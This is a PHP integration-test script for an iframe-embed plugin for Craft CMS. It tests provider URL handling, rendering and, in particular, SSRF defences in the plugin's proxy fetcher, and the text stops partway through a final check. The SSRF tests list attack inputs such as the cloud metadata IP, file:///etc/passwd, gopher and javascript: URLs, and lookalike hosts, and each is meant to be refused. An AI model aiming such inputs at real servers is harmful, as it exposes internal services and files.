<?php
/**
 * Eye integration checks.
 *
 * Run inside the plugin-testing container, from the site root:
 *
 *     ddev exec php /var/www/craft-eye/tests/integration/checks.php
 *
 * Covers what unit fixtures cannot: real element saves, reference-tag resolution through Craft's
 * own parser, the render pipeline end to end, and — the part that matters most — that the fetcher
 * refuses everything it is supposed to refuse.
 *
 * Idempotent and self-cleaning: every element it creates is deleted on the way out, and the
 * plugin settings it changes are put back.
 */

$root = getcwd();
require $root . '/bootstrap.php';

/** @var craft\console\Application $app */
$app = require CRAFT_VENDOR_PATH . '/craftcms/cms/bootstrap/console.php';

use craft\helpers\Json;
use justinholtweb\eye\elements\Embed;
use justinholtweb\eye\helpers\Ip;
use justinholtweb\eye\models\EmbedOptions;
use justinholtweb\eye\models\FramabilityResult;
use justinholtweb\eye\models\InlineEmbed;
use justinholtweb\eye\Plugin;

$passed = 0;
$failed = 0;
$created = [];

function check(string $label, callable $test): void
{
    global $passed, $failed;

    try {
        $result = $test();

        if ($result === true) {
            $passed++;
            echo "  ✓ $label\n";

            return;
        }

        $failed++;
        echo "  ✗ $label\n    " . (is_string($result) ? $result : 'returned ' . var_export($result, true)) . "\n";
    } catch (Throwable $e) {
        $failed++;
        echo "  ✗ $label\n    " . get_class($e) . ': ' . $e->getMessage() . "\n    " . $e->getFile() . ':' . $e->getLine() . "\n";
    }
}

function section(string $title): void
{
    echo "\n$title\n";
}

$plugin = Plugin::getInstance();
$suffix = substr(md5((string)microtime(true)), 0, 6);
$originalSettings = $plugin->getSettings()->toArray();

// -----------------------------------------------------------------------------
section('Options model');

check('defaults are a responsive 16:9 lazy embed', function() {
    $options = new EmbedOptions();

    return $options->mode === 'ratio' && $options->loading === 'lazy' && $options->getAspectRatio() === '16 / 9'
        ?: "got $options->mode / $options->loading / " . var_export($options->getAspectRatio(), true);
});

check('ratios are accepted in every spelling an author might type', function() {
    foreach (['16:9' => '16 / 9', '16x9' => '16 / 9', '4/3' => '4 / 3', '1.5' => '1.5 / 1'] as $input => $expected) {
        $options = EmbedOptions::fromArray(['ratio' => $input]);

        if ($options->getAspectRatio() !== $expected) {
            return "$input became " . var_export($options->getAspectRatio(), true) . ", expected $expected";
        }
    }

    return true;
});

check('a nonsense ratio leaves the default alone', function() {
    return EmbedOptions::fromArray(['ratio' => 'wide-ish'])->ratio === '16:9';
});

check('unknown sandbox tokens are dropped, not passed through', function() {
    $options = EmbedOptions::fromArray(['sandbox' => 'allow-scripts allow-everything allow-forms']);

    return $options->sandbox === ['allow-scripts', 'allow-forms']
        ?: 'got ' . json_encode($options->sandbox);
});

check('a null sandbox omits the attribute; an empty one does not', function() {
    $none = new EmbedOptions();
    $empty = EmbedOptions::fromArray(['sandbox' => []]);

    return $none->getSandboxAttribute() === null && $empty->getSandboxAttribute() === ''
        ?: 'got ' . var_export($none->getSandboxAttribute(), true) . ' / ' . var_export($empty->getSandboxAttribute(), true);
});

check('allowFullscreen adds fullscreen to the allow attribute exactly once', function() {
    $options = EmbedOptions::fromArray(['allow' => ['autoplay', 'fullscreen'], 'allowFullscreen' => true]);

    return $options->getAllowAttribute() === 'autoplay; fullscreen'
        ?: 'got ' . var_export($options->getAllowAttribute(), true);
});

check('the sandbox warning fires only for a same-origin proxy', function() {
    $proxy = EmbedOptions::fromArray(['mode' => 'proxy', 'sandbox' => ['allow-scripts', 'allow-same-origin']]);
    $ratio = EmbedOptions::fromArray(['mode' => 'ratio', 'sandbox' => ['allow-scripts', 'allow-same-origin']]);

    return $proxy->getSandboxWarning() !== null && $ratio->getSandboxWarning() === null;
});

check('reference-tag options parse bare words as what they obviously mean', function() {
    $parsed = EmbedOptions::parseEmbedOptions('click,proxy,full,height=600,no-showLoader');

    return ($parsed['loading'] ?? null) === 'click'
        && ($parsed['mode'] ?? null) === 'proxy'
        && ($parsed['align'] ?? null) === 'full'
        && ($parsed['height'] ?? null) === '600'
        && ($parsed['showLoader'] ?? null) === false
        ?: 'got ' . json_encode($parsed);
});

check('merge never mutates the original', function() {
    $base = new EmbedOptions();
    $merged = $base->merge(['loading' => 'click']);

    return $base->loading === 'lazy' && $merged->loading === 'click';
});

check('storage arrays carry only what differs from the defaults', function() {
    $options = EmbedOptions::fromArray(['loading' => 'click', 'height' => 480]);
    $stored = $options->toStorageArray();

    return $stored === ['loading' => 'click'] ?: 'got ' . json_encode($stored);
});

check('needsRuntime is false for a plain ratio embed with no timeout', function() {
    $plain = EmbedOptions::fromArray(['timeout' => 0]);
    $clicky = EmbedOptions::fromArray(['timeout' => 0, 'loading' => 'click']);

    return $plain->getNeedsRuntime() === false && $clicky->getNeedsRuntime() === true;
});

// -----------------------------------------------------------------------------
section('Providers');

$providers = $plugin->providers;

check('a YouTube watch URL becomes a nocookie embed URL', function() use ($providers) {
    $match = $providers->match('https://www.youtube.com/watch?v=dQw4w9WgXcQ', true);

    return $match->provider->handle === 'youtube'
        && $match->embedUrl === 'https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ'
        ?: 'got ' . $match->embedUrl;
});

check('privacy mode off uses the ordinary YouTube host', function() use ($providers) {
    return $providers->match('https://youtu.be/dQw4w9WgXcQ', false)->embedUrl === 'https://www.youtube.com/embed/dQw4w9WgXcQ';
});

check('a YouTube start time is translated into the player’s own parameter', function() use ($providers) {
    $match = $providers->match('https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=1m30s', false);

    return str_contains($match->embedUrl, 'start=90') ?: 'got ' . $match->embedUrl;
});

check('a YouTube short is 9:16, not 16:9', function() use ($providers) {
    $match = $providers->match('https://www.youtube.com/shorts/abc123XYZ_-', false);

    return ($match->getOptionDefaults()['ratio'] ?? null) === '9:16'
        ?: 'got ' . json_encode($match->getOptionDefaults());
});

check('a YouTube poster image is offered for the consent card', function() use ($providers) {
    return $providers->match('https://youtu.be/dQw4w9WgXcQ')->posterUrl === 'https://i.ytimg.com/vi/dQw4w9WgXcQ/hqdefault.jpg';
});

check('an unlisted Vimeo URL keeps its access hash', function() use ($providers) {
    $match = $providers->match('https://vimeo.com/123456789/abcdef1234', false);

    return $match->embedUrl === 'https://player.vimeo.com/video/123456789?h=abcdef1234'
        ?: 'got ' . $match->embedUrl;
});

check('Vimeo gets a do-not-track flag in privacy mode', function() use ($providers) {
    return str_contains($providers->match('https://vimeo.com/123456789', true)->embedUrl, 'dnt=1');
});

check('a Spotify track is shorter than a Spotify album', function() use ($providers) {
    $track = $providers->match('https://open.spotify.com/track/abc123')->getOptionDefaults();
    $album = $providers->match('https://open.spotify.com/album/abc123')->getOptionDefaults();

    return $track['height'] === 152 && $album['height'] === 352
        ?: "got {$track['height']} / {$album['height']}";
});

check('a CodePen team pen keeps its team path', function() use ($providers) {
    $match = $providers->match('https://codepen.io/team/codepen/pen/PNaGbb');

    return $match->provider->handle === 'codepen' && $match->embedUrl === 'https://codepen.io/team/codepen/embed/PNaGbb?default-tab=result'
        ?: "got {$match->provider->handle} / {$match->embedUrl}";
});

check('a Google Doc becomes a preview, a Form becomes an embedded viewform', function() use ($providers) {
    $doc = $providers->match('https://docs.google.com/document/d/1AbC_def/edit');
    $form = $providers->match('https://docs.google.com/forms/d/e/1FAIpQL/viewform');

    return str_ends_with($doc->embedUrl, '/preview') && str_contains($form->embedUrl, 'embedded=true')
        ?: $doc->embedUrl . ' / ' . $form->embedUrl;
});

check('an already-embeddable Google Maps URL is passed through untouched', function() use ($providers) {
    $url = 'https://www.google.com/maps/embed?pb=!1m18!1m12';

    return $providers->match($url)->embedUrl === $url;
});

check('a Google Maps place URL becomes an embed query', function() use ($providers) {
    $match = $providers->match('https://www.google.com/maps/place/Eiffel+Tower/@48.858,2.294,17z');

    return str_contains($match->embedUrl, 'output=embed') && str_contains($match->embedUrl, 'Eiffel')
        ?: 'got ' . $match->embedUrl;
});

check('an OpenStreetMap hash becomes a bounding box', function() use ($providers) {
    $match = $providers->match('https://www.openstreetmap.org/#map=15/51.5074/-0.1278');

    return $match !== null && str_contains($match->embedUrl, 'bbox=') && str_contains($match->embedUrl, 'marker=51.5074')
        ?: 'got ' . ($match->embedUrl ?? 'null');
});

check('a PDF URL is recognised and given page proportions', function() use ($providers) {
    $match = $providers->match('https://example.com/reports/annual.pdf');

    return $match->provider->handle === 'pdf' && $match->provider->ratio === '17:22';
});

check('an unrecognised URL still produces a usable generic match', function() use ($providers) {
    $match = $providers->match('https://example.com/some/page');

    return $match->provider->getIsGeneric() && $match->embedUrl === 'https://example.com/some/page';
});

check('a non-URL matches nothing at all', function() use ($providers) {
    return $providers->match('not a url') === null && $providers->match('javascript:alert(1)') === null;
});

check('every provider definition builds a URL for its own patterns', function() use ($providers) {
    // A pattern that matches but whose builder returns null would silently fall through to the
    // generic provider, which is the kind of bug that looks like "it works" until someone checks.
    $samples = [
        'youtube' => 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
        'vimeo' => 'https://vimeo.com/123456789',
        'loom' => 'https://www.loom.com/share/0123456789abcdef',
        'wistia' => 'https://home.wistia.com/medias/abc123',
        'dailymotion' => 'https://www.dailymotion.com/video/x8abc12',
        'tiktok' => 'https://www.tiktok.com/@someone/video/1234567890',
        'instagram' => 'https://www.instagram.com/p/Abc123/',
        'x' => 'https://x.com/someone/status/1234567890',
        'spotify' => 'https://open.spotify.com/album/abc123',
        'soundcloud' => 'https://soundcloud.com/artist/track',
        'applepodcasts' => 'https://podcasts.apple.com/us/podcast/x/id123',
        'applemusic' => 'https://music.apple.com/us/album/x/123',
        'googlemaps' => 'https://www.google.com/maps?q=London',
        'openstreetmap' => 'https://www.openstreetmap.org/#map=12/51.5/-0.12',
        'googledocs' => 'https://docs.google.com/spreadsheets/d/1AbC/edit',
        'googlecalendar' => 'https://calendar.google.com/calendar/embed?src=x',
        'calendly' => 'https://calendly.com/someone/30min',
        'typeform' => 'https://form.typeform.com/to/AbC123',
        'airtable' => 'https://airtable.com/shrAbc123',
        'figma' => 'https://www.figma.com/design/AbC/Name',
        'miro' => 'https://miro.com/app/board/AbC123=/',
        'canva' => 'https://www.canva.com/design/AbC123/view',
        'codepen' => 'https://codepen.io/someone/pen/AbC123',
        'jsfiddle' => 'https://jsfiddle.net/someone/abc123/',
        'codesandbox' => 'https://codesandbox.io/s/abc-123',
        'descript' => 'https://share.descript.com/view/abc123',
        'pdf' => 'https://example.com/file.pdf',
    ];

    $problems = [];

    foreach ($samples as $handle => $url) {
        $match = $providers->match($url, false);

        if ($match === null) {
            $problems[] = "$handle: no match at all";
            continue;
        }

        if ($match->provider->handle !== $handle) {
            $problems[] = "$handle: matched {$match->provider->handle} instead";
            continue;
        }

        if (!preg_match('~^https?://~', $match->embedUrl)) {
            $problems[] = "$handle: built “{$match->embedUrl}”";
        }
    }

    return $problems === [] ?: implode('; ', $problems);
});

check('isKnown separates recognised services from merely framable URLs', function() use ($providers) {
    return $providers->isKnown('https://youtu.be/dQw4w9WgXcQ') === true
        && $providers->isKnown('https://example.com/') === false;
});

// -----------------------------------------------------------------------------
section('SSRF guards');

check('private, loopback, link-local and CGNAT addresses are all refused', function() {
    $blocked = ['127.0.0.1', '10.0.0.1', '192.168.1.1', '172.16.0.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '255.255.255.255'];

    foreach ($blocked as $ip) {
        if (Ip::isPublic($ip)) {
            return "$ip was allowed";
        }
    }

    return true;
});

check('IPv4-mapped IPv6 cannot smuggle loopback past the IPv4 checks', function() {
    return Ip::isPublic('::ffff:127.0.0.1') === false
        && Ip::isPublic('::ffff:10.0.0.1') === false
        && Ip::isPublic('::ffff:8.8.8.8') === true;
});

check('IPv6 unique-local, link-local and 6to4 are refused', function() {
    foreach (['::1', 'fc00::1', 'fd12:3456::1', 'fe80::1', '2002:7f00:1::', '64:ff9b::7f00:1'] as $ip) {
        if (Ip::isPublic($ip)) {
            return "$ip was allowed";
        }
    }

    return true;
});

check('ordinary public addresses are allowed', function() {
    return Ip::isPublic('8.8.8.8') && Ip::isPublic('2606:4700:4700::1111');
});

check('a host resolving to a private address is refused wholesale', function() {
    return Ip::resolvePublic('localhost') === [];
});

check('garbage is refused rather than guessed at', function() {
    return Ip::isPublic('not-an-ip') === false && Ip::isPublic('') === false;
});

check('the host allowlist matches exactly, and wildcards cover the apex', function() use ($plugin) {
    $plugin->getSettings()->allowedHosts = ['example.com', '*.wikipedia.org'];
    $fetcher = $plugin->fetcher;

    $cases = [
        'example.com' => true,
        'EXAMPLE.COM' => true,
        'sub.example.com' => false,
        'notexample.com' => false,
        'example.com.evil.net' => false,
        'en.wikipedia.org' => true,
        'wikipedia.org' => true,
        'a.b.wikipedia.org' => true,
        'wikipedia.org.evil.net' => false,
    ];

    foreach ($cases as $host => $expected) {
        if ($fetcher->hostIsAllowed($host) !== $expected) {
            return "$host was " . ($expected ? 'refused' : 'allowed');
        }
    }

    return true;
});

check('the proxy refuses to fetch while it is switched off', function() use ($plugin) {
    $plugin->getSettings()->proxyEnabled = false;

    try {
        $plugin->fetcher->fetch('https://example.com/');
    } catch (Throwable $e) {
        return str_contains($e->getMessage(), 'disabled') ?: 'wrong reason: ' . $e->getMessage();
    }

    return 'it fetched anyway';
});

check('an enabled proxy with an empty allowlist still fetches nothing', function() use ($plugin) {
    $plugin->getSettings()->proxyEnabled = true;
    $plugin->getSettings()->allowedHosts = [];

    try {
        $plugin->fetcher->fetch('https://example.com/');
    } catch (Throwable $e) {
        return str_contains($e->getMessage(), 'allowed hosts') ?: 'wrong reason: ' . $e->getMessage();
    }

    return 'it fetched anyway';
});

check('a host off the allowlist is refused', function() use ($plugin) {
    $plugin->getSettings()->proxyEnabled = true;
    $plugin->getSettings()->allowedHosts = ['example.com'];

    try {
        $plugin->fetcher->fetch('https://evil.test/');
    } catch (Throwable $e) {
        return str_contains($e->getMessage(), 'not in Eye’s allowed hosts') ?: 'wrong reason: ' . $e->getMessage();
    }

    return 'it fetched anyway';
});

check('non-http schemes are refused', function() use ($plugin) {
    $plugin->getSettings()->allowedHosts = ['*'];

    foreach (['file:///etc/passwd', 'gopher://example.com/', 'ftp://example.com/'] as $url) {
        try {
            $plugin->fetcher->fetch($url);

            return "$url was fetched";
        } catch (Throwable $e) {
            // Any refusal is the right answer here.
        }
    }

    return true;
});

check('a URL carrying credentials is refused', function() use ($plugin) {
    $plugin->getSettings()->allowedHosts = ['example.com'];

    try {
        $plugin->fetcher->fetch('https://user:pass@example.com/');
    } catch (Throwable $e) {
        return str_contains($e->getMessage(), 'credentials') ?: 'wrong reason: ' . $e->getMessage();
    }

    return 'it fetched anyway';
});

check('a host that resolves to a private address is refused even when allowed', function() use ($plugin) {
    $plugin->getSettings()->allowedHosts = ['localhost'];

    try {
        $plugin->fetcher->fetch('http://localhost/');
    } catch (Throwable $e) {
        return str_contains($e->getMessage(), 'public address') ?: 'wrong reason: ' . $e->getMessage();
    }

    return 'it fetched anyway';
});

check('an unusual port is refused', function() use ($plugin) {
    $plugin->getSettings()->allowedHosts = ['example.com'];

    try {
        $plugin->fetcher->fetch('https://example.com:6379/');
    } catch (Throwable $e) {
        return str_contains($e->getMessage(), 'port') ?: 'wrong reason: ' . $e->getMessage();
    }

    return 'it fetched anyway';
});

// The pin is only as good as the handler that honours it. Guzzle's default stack hands a
// streamed request to PHP's stream wrapper, which ignores CURLOPT_RESOLVE and looks the host up
// again — so this substitutes the harness's own web server for example.com's address and asserts
// that is where the connection went, asking for its robots.txt — a static file, so nginx answers
// at once rather than queueing behind a full Craft render. No internet needed: an unpinned fetch fails or gets the
// real example.com, and either way not this.
$pinned = new class() extends \justinholtweb\eye\services\Fetcher {
    protected function addressesFor(string $host): array
    {
        return ['127.0.0.1'];
    }
};

check('the connection goes to the validated address, not a second lookup', function() use ($plugin, $pinned) {
    $plugin->getSettings()->proxyEnabled = true;
    $plugin->getSettings()->allowedHosts = ['example.com'];

    try {
        $result = $pinned->fetch('http://example.com/robots.txt', ['timeout' => 10]);
    } catch (Throwable $e) {
        return 'fetch failed: ' . $e->getMessage();
    }

    $local = file_get_contents(Craft::getAlias('@webroot/robots.txt'));

    return $result->body === $local ?: 'reached somewhere other than the pinned address';
});

check('every validated address is offered to curl, IPv4 first', function() use ($plugin) {
    // Separate CURLOPT_RESOLVE entries for one host replace each other, so only the last would
    // survive — here an unroutable documentation address, and the fetch would fail.
    $fetcher = new class() extends \justinholtweb\eye\services\Fetcher {
        protected function addressesFor(string $host): array
        {
            return ['2001:db8::1', '127.0.0.1'];
        }
    };
    $plugin->getSettings()->allowedHosts = ['example.com'];

    try {
        $result = $fetcher->fetch('http://example.com/robots.txt', ['timeout' => 10]);
    } catch (Throwable $e) {
        return 'fetch failed: ' . $e->getMessage();
    }

    return $result->status === 200 ?: "status $result->status";
});

check('a body over the size cap is abandoned as it arrives', function() use ($plugin, $pinned) {
    $plugin->getSettings()->allowedHosts = ['example.com'];

    try {
        $pinned->fetch('http://example.com/', ['timeout' => 30, 'maxBytes' => 2048]);
    } catch (Throwable $e) {
        return str_contains($e->getMessage(), 'larger than') ?: 'wrong reason: ' . $e->getMessage();
    }

    return 'it fetched anyway';
});

check('a header probe returns the headers without the body', function() use ($pinned) {
    try {
        $result = $pinned->probe('http://example.com/robots.txt');
    } catch (Throwable $e) {
        return 'probe failed: ' . $e->getMessage();
    }

    return $result->status === 200 && $result->body === ''
        ?: "got {$result->status} with " . strlen((string)$result->body) . ' bytes';
});

check('a redirect Location resolves against the URL it came from', function() use ($plugin) {
    $cases = [
        ['/about', 'https://example.com/docs/x.html', 'https://example.com/about'],
        ['next.html', 'https://example.com/docs/x.html', 'https://example.com/docs/next.html'],
        ['//cdn.example.com/y', 'https://example.com/x', 'https://cdn.example.com/y'],
        ['https://elsewhere.example/z', 'https://example.com/x', 'https://elsewhere.example/z'],
    ];

    foreach ($cases as [$location, $base, $expected]) {
        $got = callPrivate($plugin->fetcher, 'absoluteUrl', [$location, $base]);

        if ($got !== $expected) {
            return "$location against $base became " . var_export($got, true);
        }
    }

    return true;
});

check('a redirect to a non-http scheme is not followed', function() use ($plugin) {
    foreach (['file:///etc/passwd', 'javascript:alert(1)', 'data:text/html,x', ''] as $location) {
        if (callPrivate($plugin->fetcher, 'absoluteUrl', [$location, 'https://example.com/']) !== null) {
            return "“$location” was followed";
        }
    }

    return true;
});

// -----------------------------------------------------------------------------
section('Proxy route signing');

check('a signed payload round-trips', function() use ($plugin) {
    $options = EmbedOptions::fromArray(['extract' => '#main', 'linkTarget' => 'self']);
    $signed = $plugin->proxyRoutes->sign('https://example.com/page', $options);
    $verified = $plugin->proxyRoutes->verify($signed);

    return $verified !== null
        && $verified['url'] === 'https://example.com/page'
        && $verified['options']->extract === '#main'
        && $verified['options']->linkTarget === 'self'
        ?: 'got ' . json_encode($verified === null ? null : $verified['url']);
});

check('a tampered payload is rejected', function() use ($plugin) {
    $signed = $plugin->proxyRoutes->sign('https://example.com/page', new EmbedOptions());
    $tampered = str_replace('example.com', 'evil.test', base64_encode('x')) . substr($signed, 1);

    return $plugin->proxyRoutes->verify($tampered) === null
        && $plugin->proxyRoutes->verify('nonsense') === null;
});

check('a payload cannot smuggle in options it is not allowed to carry', function() use ($plugin) {
    // `mode` is forced to proxy on the way out; a payload claiming otherwise must not change it.
    $signed = $plugin->proxyRoutes->sign('https://example.com/', EmbedOptions::fromArray(['mode' => 'inline', 'height' => 9999]));
    $verified = $plugin->proxyRoutes->verify($signed);

    return $verified['options']->mode === 'proxy' && $verified['options']->height === 480
        ?: 'got ' . $verified['options']->mode . ' / ' . $verified['options']->height;
});

check('the signed-payload parameter is not one of Craft’s own', function() use ($plugin) {
    // `p` is Craft's `pathParam`: `?p=some/path` is how Craft is told which page was requested,
    // so a payload sent as `p` is read as a request path and the route 404s before any
    // controller runs. `token` and `siteToken` are reserved the same way.
    $param = \justinholtweb\eye\services\ProxyRoutes::PARAM;
    $reserved = [
        Craft::$app->getConfig()->getGeneral()->pathParam,
        Craft::$app->getConfig()->getGeneral()->tokenParam,
        'siteToken',
    ];

    return !in_array($param, array_filter($reserved), true) ?: "the payload travels as “$param”";
});

check('a signed proxy URL carries the payload under that parameter', function() use ($plugin) {
    $url = $plugin->proxyRoutes->urlFor('https://example.com/', new EmbedOptions());

    return str_contains($url, \justinholtweb\eye\services\ProxyRoutes::PARAM . '=') ?: 'got ' . $url;
});

check('a proxy URL for a stored embed carries the uid, not the target URL', function() use ($plugin) {
    $url = $plugin->proxyRoutes->urlFor('https://example.com/secret', new EmbedOptions(), 'some-uid-1234');

    return str_contains($url, 'some-uid-1234') && !str_contains($url, 'example.com')
        ?: 'got ' . $url;
});

// -----------------------------------------------------------------------------
section('Framability verdicts');

check('frame-ancestors none is a refusal', function() use ($plugin) {
    $result = callPrivate($plugin->framability, 'judgeAncestors', [new FramabilityResult(), ["'none'"]]);

    return $result->status === FramabilityResult::STATUS_DENIED;
});

check('frame-ancestors * allows anyone', function() use ($plugin) {
    $result = callPrivate($plugin->framability, 'judgeAncestors', [new FramabilityResult(), ['*']]);

    return $result->status === FramabilityResult::STATUS_ALLOWED;
});

check('a frame-ancestors list that omits this site is a restriction, not a refusal', function() use ($plugin) {
    $result = callPrivate($plugin->framability, 'judgeAncestors', [new FramabilityResult(), ['https://someone-else.example']]);

    return $result->status === FramabilityResult::STATUS_RESTRICTED;
});

check('X-Frame-Options DENY is a refusal and SAMEORIGIN is a restriction', function() use ($plugin) {
    $deny = callPrivate($plugin->framability, 'judgeXfo', [new FramabilityResult(['url' => 'https://elsewhere.example/']), 'DENY']);
    $same = callPrivate($plugin->framability, 'judgeXfo', [new FramabilityResult(['url' => 'https://elsewhere.example/']), 'SAMEORIGIN']);

    return $deny->status === FramabilityResult::STATUS_DENIED && $same->status === FramabilityResult::STATUS_RESTRICTED
        ?: "$deny->status / $same->status";
});

check('the non-standard X-Frame-Options ALLOWALL is read as embeddable', function() use ($plugin) {
    $result = callPrivate($plugin->framability, 'judgeXfo', [new FramabilityResult(['url' => 'https://elsewhere.example/']), 'ALLOWALL']);

    return $result->status === FramabilityResult::STATUS_ALLOWED ?: $result->status;
});

check('frame-ancestors is found among other directives and other policies', function() use ($plugin) {
    $header = "default-src 'self'; script-src 'unsafe-inline'; frame-ancestors 'self' https://a.example; img-src *";
    $found = callPrivate($plugin->framability, 'frameAncestors', [$header]);

    return $found === ["'self'", 'https://a.example'] ?: 'got ' . json_encode($found);
});

check('a CSP with no frame-ancestors is distinguished from one with an empty list', function() use ($plugin) {
    return callPrivate($plugin->framability, 'frameAncestors', ["default-src 'self'"]) === null;
});

check('the check probes the embed URL, not the URL the author pasted', function() use ($plugin) {
    // YouTube's watch page sends X-Frame-Options: SAMEORIGIN while its /embed/ URL is built to be
    // framed. Probing the pasted URL would put a red badge on the commonest embed there is.
    $resolved = callPrivate($plugin->framability, 'siteOrigin', []);

    $watch = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
    $expected = $plugin->providers->match($watch)->embedUrl;

    return str_contains($expected, '/embed/') && $expected !== $watch && $resolved !== ''
        ?: "resolved to $expected";
});

check('resolving an embed URL again returns the same URL', function() use ($plugin) {
    // The check above only holds because resolution is idempotent — otherwise the cache key
    // would drift every time a verdict was refreshed.
    $once = $plugin->providers->match('https://www.youtube.com/watch?v=dQw4w9WgXcQ', true)->embedUrl;
    $twice = $plugin->providers->match($once, true)->embedUrl;

    return $once === $twice ?: "$once then $twice";
});

check('a problem verdict carries a suggestion an author can act on', function() {
    $denied = new FramabilityResult(['status' => FramabilityResult::STATUS_DENIED]);
    $allowed = new FramabilityResult(['status' => FramabilityResult::STATUS_ALLOWED]);

    return $denied->getIsProblem() && $denied->getSuggestion() !== '' && !$allowed->getIsProblem();
});

// -----------------------------------------------------------------------------
section('Embed element');

$embed = null;

check('an embed saves, deriving its handle, title and provider from the URL alone', function() use ($plugin, $suffix, &$embed, &$created) {
    $embed = new Embed();
    $embed->url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
    $embed->title = "Eye check $suffix";

    if (!$plugin->embeds->saveEmbed($embed)) {
        return 'errors: ' . json_encode($embed->getErrors());
    }

    $created[] = $embed->id;

    return $embed->handle !== null && $embed->provider === 'youtube'
        ?: "handle=$embed->handle provider=$embed->provider";
});

check('the embed is findable by handle', function() use ($plugin, &$embed) {
    return $plugin->embeds->getEmbedByHandle((string)$embed->handle)?->id === $embed->id;
});

check('a duplicate handle is refused', function() use ($plugin, &$embed, &$created) {
    $other = new Embed();
    $other->url = 'https://example.com/';
    $other->handle = $embed->handle;
    $other->title = 'Duplicate';

    $saved = $plugin->embeds->saveEmbed($other);

    if ($saved) {
        $created[] = $other->id;

        return 'it saved anyway';
    }

    return $other->hasErrors('handle');
});

check('a trashed embed releases its handle, and gets it back on restore', function() use ($plugin, $suffix, &$created) {
    $embed = new Embed();
    $embed->url = 'https://vimeo.com/123456789';
    $embed->handle = "eye-recycle-$suffix";
    $embed->title = 'Recyclable';

    if (!$plugin->embeds->saveEmbed($embed)) {
        return 'could not save: ' . json_encode($embed->getErrors());
    }

    $id = $embed->id;
    Craft::$app->getElements()->deleteElement($embed);

    if ($plugin->embeds->handleIsTaken("eye-recycle-$suffix")) {
        return 'the handle was still taken after deletion';
    }

    $restored = Craft::$app->getElements()->getElementById($id, Embed::class, null, ['trashed' => true]);
    Craft::$app->getElements()->restoreElement($restored);

    $back = Craft::$app->getElements()->getElementById($id, Embed::class);
    $created[] = $id;

    return $back && $back->handle === "eye-recycle-$suffix" ?: 'came back as ' . ($back->handle ?? 'nothing');
});

check('a URL with no scheme is refused', function() use ($plugin, &$created) {
    $embed = new Embed();
    $embed->url = 'example.com/thing';
    $embed->title = 'Schemeless';

    if ($plugin->embeds->saveEmbed($embed)) {
        $created[] = $embed->id;

        return 'it saved anyway';
    }

    return $embed->hasErrors('url');
});

check('a proxy embed is refused while the proxy is off', function() use ($plugin, &$created) {
    $plugin->getSettings()->proxyEnabled = false;

    $embed = new Embed();
    $embed->url = 'https://example.com/page';
    $embed->title = 'Proxied';
    $embed->setOptions(EmbedOptions::fromArray(['mode' => 'proxy']));

    if ($plugin->embeds->saveEmbed($embed)) {
        $created[] = $embed->id;

        return 'it saved anyway';
    }

    return $embed->hasErrors('mode');
});

check('a proxy embed is refused for a host that is not allowed', function() use ($plugin, &$created) {
    $plugin->getSettings()->proxyEnabled = true;
    $plugin->getSettings()->allowedHosts = ['allowed.example'];

    $embed = new Embed();
    $embed->url = 'https://not-allowed.example/page';
    $embed->title = 'Proxied elsewhere';
    $embed->setOptions(EmbedOptions::fromArray(['mode' => 'proxy']));

    if ($plugin->embeds->saveEmbed($embed)) {
        $created[] = $embed->id;

        return 'it saved anyway';
    }

    return $embed->hasErrors('mode');
});

check('options survive a save and a reload', function() use ($plugin, $suffix, &$created) {
    $embed = new Embed();
    $embed->url = 'https://example.com/thing';
    $embed->title = 'Round trip';
    $embed->handle = "eye-roundtrip-$suffix";
    $embed->setOptions(EmbedOptions::fromArray([
        'mode' => 'fixed',
        'height' => 512,
        'loading' => 'click',
        'sandbox' => ['allow-scripts'],
        'caption' => 'A caption',
    ]));

    if (!$plugin->embeds->saveEmbed($embed)) {
        return 'could not save: ' . json_encode($embed->getErrors());
    }

    $created[] = $embed->id;

    $reloaded = Craft::$app->getElements()->getElementById($embed->id, Embed::class);
    $options = $reloaded->getOptions();

    return $options->mode === 'fixed'
        && $options->height === 512
        && $options->loading === 'click'
        && $options->sandbox === ['allow-scripts']
        && $options->caption === 'A caption'
        && $reloaded->mode === 'fixed'
        ?: 'got ' . json_encode($options->toStorageArray());
});

check('createFromUrl applies the provider’s defaults', function() use ($plugin) {
    $embed = $plugin->embeds->createFromUrl('https://open.spotify.com/track/abc123');

    return $embed->getOptions()->mode === 'fixed' && $embed->getOptions()->height === 152
        ?: 'got ' . $embed->getOptions()->mode . ' / ' . $embed->getOptions()->height;
});

check('uniqueHandle suffixes rather than collides', function() use ($plugin, &$embed) {
    $handle = $plugin->embeds->uniqueHandle((string)$embed->handle);

    return $handle !== $embed->handle && str_starts_with($handle, (string)$embed->handle)
        ?: 'got ' . $handle;
});

// -----------------------------------------------------------------------------
section('Rendering');

check('an embed renders a figure, an iframe and the right src', function() use (&$embed) {
    $html = (string)$embed->render();

    return str_contains($html, '<figure')
        && str_contains($html, '<iframe')
        && str_contains($html, 'youtube')
        && str_contains($html, 'aspect-ratio:16 / 9')
        ?: 'got ' . substr($html, 0, 400);
});

check('every rendered frame carries an accessible title', function() use (&$embed) {
    return str_contains((string)$embed->render(), 'title="');
});

check('render overrides change this appearance only', function() use (&$embed) {
    $clicky = (string)$embed->render(['loading' => 'click']);
    $normal = (string)$embed->render();

    return str_contains($clicky, 'eye-consent')
        && !str_contains($normal, 'eye-consent')
        ?: 'override did not take';
});

check('click-to-load parks the iframe in a template so nothing is requested', function() use (&$embed) {
    $html = (string)$embed->render(['loading' => 'click']);

    // The iframe must appear only inside <template>. A `hidden` iframe still loads, which is the
    // mistake most consent banners make.
    $beforeTemplate = substr($html, 0, (int)strpos($html, '<template'));

    return str_contains($html, '<template') && !str_contains($beforeTemplate, '<iframe')
        ?: 'an iframe was rendered outside the template';
});

check('a click-to-load embed still offers a link without JavaScript', function() use (&$embed) {
    return str_contains((string)$embed->render(['loading' => 'click']), '<noscript>');
});

check('a disabled embed renders nothing at all', function() use ($plugin, $suffix, &$created) {
    $embed = new Embed();
    $embed->url = 'https://example.com/off';
    $embed->title = 'Switched off';
    $embed->handle = "eye-disabled-$suffix";
    $embed->enabled = false;

    if (!$plugin->embeds->saveEmbed($embed)) {
        return 'could not save: ' . json_encode($embed->getErrors());
    }

    $created[] = $embed->id;

    return (string)$embed->render() === '';
});

check('a sandbox attribute is written only when one was asked for', function() use ($plugin) {
